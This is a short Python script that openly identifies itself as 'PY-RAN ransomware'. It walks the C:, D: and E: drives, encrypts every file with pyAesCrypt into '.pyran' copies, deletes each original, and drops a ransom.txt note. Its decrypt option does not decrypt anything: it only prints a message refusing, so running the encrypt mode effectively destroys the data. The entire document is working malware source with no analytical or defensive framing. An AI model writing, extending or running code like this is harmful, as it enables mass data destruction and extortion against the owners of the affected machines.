import argparse
import os
import base64
import pyAesCrypt

def EncryptFile(file, password):
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(file, file + ".pyran", password, bufferSize)
    os.remove(file)

parser = argparse.ArgumentParser()
parser.add_argument("--mode", help="Accepts encrypt or decrypt arguments.")
parser.add_argument("--password", help="Password to use for encryption/decryption.")
args = parser.parse_args()

drives = ["C:", "D:", "E:"]  # Add more drives if needed

if args.mode == "encrypt":
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                EncryptFile(os.path.join(root, file), args.password)
    print("Encryption Done!")
    f = open("ransom.txt", "w+")
    f.write("PY-RAN ransomware successfully encrypted the files.")
    f.close()

elif args.mode == "decrypt":
    print("Decryption mode selected. Please provide the specific folder path instead of --dir argument.")
    print("Decryption is not supported in this script for security reasons.")
